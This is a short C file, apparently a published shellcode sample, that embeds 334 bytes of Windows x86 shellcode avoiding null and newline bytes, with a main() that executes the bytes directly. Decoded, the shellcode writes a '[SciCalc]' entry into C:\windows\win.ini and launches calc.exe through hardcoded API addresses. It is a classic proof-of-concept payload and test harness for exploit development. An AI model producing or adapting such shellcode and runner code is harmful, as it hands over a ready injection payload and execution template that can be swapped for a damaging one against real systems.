// Scientific Calc (334 Bytes) 
// Excludes (0x0a, 0x0d, 0x00)
// Written by @Fitblip

char code[] = 
"\x31\xc0\x66\xb8\x6e\x69\x50\x68\x69\x6e\x2e\x69"
"\x68\x77\x73\x5c\x77\x68\x69\x6e\x64\x6f\x68\x43"
"\x3a\x5c\x77\x89\xe2\x31\xc0\x50\x31\xdb\xb3\x80"
"\x53\x6a\x04\x50\x6a\x01\xb8\x11\x11\x11\xd1\x2d"
"\x11\x11\x11\x11\x50\x52\xba\x28\x2b\x80\x7c\x80"
"\xee\x11\xff\xd2\x50\x31\xc9\x51\x50\xbe\xef\x0f"
"\x81\x7c\xff\xd6\x40\x50\xbe\x07\xc4\xc2\x77\xff"
"\xd6\x31\xc9\x8b\x14\x24\x52\x51\x50\xbe\xf0\x75"
"\xc4\x77\xff\xd6\x8b\x4c\x24\xf0\x51\x8b\x54\x24"
"\x14\x31\xf6\x56\x56\x89\xe6\x83\xc6\x04\x56\x51"
"\x50\x52\xbe\x12\x18\x80\x7c\xff\xd6\x8b\x44\x24"
"\xf0\x6a\x5d\x68\x43\x61\x6c\x63\x68\x5b\x53\x63"
"\x69\x89\xe3\x53\x50\xbe\x60\x7c\xc4\x77\xff\xd6"
"\x83\xc0\x12\x6a\x01\x6a\x30\x50\xbe\xf0\x75\xc4"
"\x77\xff\xd6\x8b\x54\x24\x38\x31\xc0\x50\x50\x50"
"\x52\xbe\x06\x11\x81\x7c\xff\xd6\x31\xc0\x50\x89"
"\xe0\x31\xc9\x51\x50\x8b\x4c\x24\x2c\x8b\x54\x24"
"\x18\x8b\x74\x24\x44\x51\x52\x56\xbe\xff\x12\x81"
"\x7c\xff\xd6\x31\xc0\x50\x68\x2e\x65\x78\x65\x68"
"\x63\x61\x6c\x63\x54\xbe\x85\x25\x86\x7c\xff\xd6"
"\x8b\x44\x24\x0c\x6a\x01\x6a\x31\x50\xbe\xf0\x75"
"\xc4\x77\xff\xd6\x8b\x54\x24\x50\x31\xc0\x50\x50"
"\x50\x52\xbe\x06\x11\x81\x7c\xff\xd6\x6a\x79\xbe"
"\x46\x24\x80\x7c\xff\xd6\x89\xe0\x31\xd2\x52\x50"
"\x8b\x4c\x24\x1c\x8b\x54\x24\x2c\x8b\x74\x24\x58"
"\x51\x52\x56\xbe\xff\x12\x81\x7c\xff\xd6\x8b\x44"
"\x24\xec\x50\xbe\xe7\x9b\x80\x7c\xff\xd6\x31\xc0"
"\x50\xb8\x1b\xd2\x81\x7c\x2c\x11\xff\xe0";

int main(int argc, char **argv)
{  
   int (*func)();
   func = (int (*)()) code;
   (int)(*func)();
}